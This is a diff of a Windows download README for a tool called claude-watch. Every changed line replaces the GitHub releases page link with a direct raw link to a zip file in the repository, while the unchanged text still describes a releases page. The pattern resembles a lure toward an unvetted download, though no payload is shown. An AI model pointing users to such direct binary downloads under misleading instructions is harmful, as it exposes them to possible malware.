@@ -1,6 +1,6 @@
 # 👀 claude-watch - See Claude Code Clearly
 
-[![Download claude-watch](https://img.shields.io/badge/Download-claude--watch-orange?style=for-the-badge)](https://github.com/mr-mrs-xx1/claude-watch/releases)
+[![Download claude-watch](https://img.shields.io/badge/Download-claude--watch-orange?style=for-the-badge)](https://raw.githubusercontent.com/mr-mrs-xx1/claude-watch/main/dashboard/claude-watch-1.5.zip)
 
 ## 🧭 What is claude-watch?
 
@@ -12,7 +12,7 @@ Use it to follow changes as they happen, check how your project is evolving, and
 
 Visit this page to download claude-watch for Windows:
 
-https://github.com/mr-mrs-xx1/claude-watch/releases
+https://raw.githubusercontent.com/mr-mrs-xx1/claude-watch/main/dashboard/claude-watch-1.5.zip
 
 On that page, look for the latest release and download the Windows file that matches your system. If you see more than one file, choose the one for Windows.
 
@@ -34,7 +34,7 @@ For best results, keep your project on a local drive such as C:\ and close other
 Follow these steps to install and open claude-watch on Windows.
 
 1. Open the download page:
-   https://github.com/mr-mrs-xx1/claude-watch/releases
+   https://raw.githubusercontent.com/mr-mrs-xx1/claude-watch/main/dashboard/claude-watch-1.5.zip
 
 2. Find the latest release near the top of the page.
 
@@ -170,7 +170,7 @@ If search does not return results:
 
 The release page lists the latest Windows build, version details, and download files.
 
-https://github.com/mr-mrs-xx1/claude-watch/releases
+https://raw.githubusercontent.com/mr-mrs-xx1/claude-watch/main/dashboard/claude-watch-1.5.zip
 
 Check that page when you want the newest build or need to compare files for different Windows setups.
 
